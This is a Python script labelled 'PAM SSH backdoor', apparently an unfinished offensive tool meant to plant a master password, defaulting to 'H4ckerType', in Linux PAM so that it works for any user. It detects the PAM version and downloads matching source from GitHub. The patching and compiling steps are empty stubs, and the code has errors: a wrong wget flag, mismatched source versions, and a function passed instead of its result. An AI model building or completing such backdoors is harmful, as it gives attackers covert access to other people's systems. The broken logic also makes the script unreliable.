#!/usr/bin/python3
#PAM SSH backdoor
#PASSWORD,no,Master password for any user
#END

import os
import subprocess

def get_pam_version():
    pam_version = subprocess.check_output("dpkg -l | grep -i libpam-modules", shell=True)
    pam_version = pam_version.decode('utf-8').split()[2]
    return pam_version

def get_pam_source_code(pam_version):
    
    if '1.1.6' in pam_version:
        os.system('wget https://github.com/linux-pam/linux-pam/archive/refs/tags/v1.1.6.zip -o /tmp/pam_source_116.zip')
    if '1.1.7' in pam_version:
        os.system('wget https://github.com/linux-pam/linux-pam/archive/refs/tags/Linux-PAM-1_1_7.zip -o /tmp/pam_source_117.zip')
    if '1.1.8' in pam_version:
        os.system('wget https://github.com/linux-pam/linux-pam/archive/refs/tags/Linux-PAM-1_1_8.zip -o /tmp/pam_source_118.zip')
    if '1.2.0' in pam_version:
        os.system('wget https://github.com/linux-pam/linux-pam/archive/refs/tags/Linux-PAM-1_2_0.zip -o /tmp/pam_source_120.zip')
    if '1.2.1' in pam_version:
        os.system('wget https://github.com/linux-pam/linux-pam/archive/refs/tags/Linux-PAM-1_2_1.zip -o /tmp/pam_source_121.zip')
    if '1.3.0' in pam_version:
        os.system('wget https://github.com/linux-pam/linux-pam/archive/refs/tags/Linux-PAM-1.3.0.zip -o /tmp/pam_source_130.zip')
    
    if '1.3.1' in pam_version:
        os.system('wget https://github.com/linux-pam/linux-pam/archive/refs/tags/v1.3.1.zip -o /tmp/pam_source.zip')
    if '1.4.0' in pam_version:
        os.system('wget https://github.com/linux-pam/linux-pam/archive/refs/tags/v1.3.1.zip -o /tmp/pam_source.zip')
    if '1.5.0' in pam_version:
        os.system('wget https://github.com/linux-pam/linux-pam/archive/refs/tags/v1.3.1.zip -o /tmp/pam_source.zip')
    if '1.5.1' in pam_version:
        os.system('wget https://github.com/linux-pam/linux-pam/archive/refs/tags/v1.3.1.zip -o /tmp/pam_source.zip')
    
    pass

def put_into_code(password):
    pass

def compile():
    pass

def create_backdoor(password):
    if password == "":
        password = "H4ckerType"

    put_into_code(password)
    compile()
    
    pass

def main(arguments):
    get_pam_source_code(get_pam_version)

    pass

print(get_pam_version())
